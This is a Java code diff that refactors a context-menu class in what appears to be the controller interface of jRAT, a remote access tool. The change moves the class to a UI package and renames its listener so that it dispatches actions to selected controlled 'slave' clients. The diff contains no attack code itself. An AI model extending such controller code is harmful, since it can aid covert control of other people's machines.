@@ -1,5 +1,6 @@
-package jrat.api;
+package jrat.api.ui;
 
+import jrat.api.ClientEventListener;
 import jrat.controller.AbstractSlave;
 import jrat.controller.ui.frames.Frame;
 
@@ -8,13 +9,16 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.util.List;
 
+/**
+ * Client context menu item
+ */
 public class ClientMenuItem {
 
     private String text;
     private ImageIcon icon;
-    private ClientMenuListener listener;
+    private ClientEventListener listener;
 
-    public ClientMenuItem(String name, ImageIcon icon, ClientMenuListener listener) {
+    public ClientMenuItem(String name, ImageIcon icon, ClientEventListener listener) {
         this.text = name;
         this.icon = icon;
         this.listener = listener;
@@ -34,9 +38,9 @@ public class ClientMenuItem {
                 List<AbstractSlave> slaves = Frame.panelClients.getSelectedSlaves();
 
                 if (slaves.size() == 1) {
-                    listener.onClick(slaves.get(0));
+                    listener.emit(slaves.get(0));
                 } else if (slaves.size() > 1) {
-                    listener.onClick((AbstractSlave[]) slaves.toArray());
+                    listener.emit((AbstractSlave[]) slaves.toArray());
                 }
             }
         });
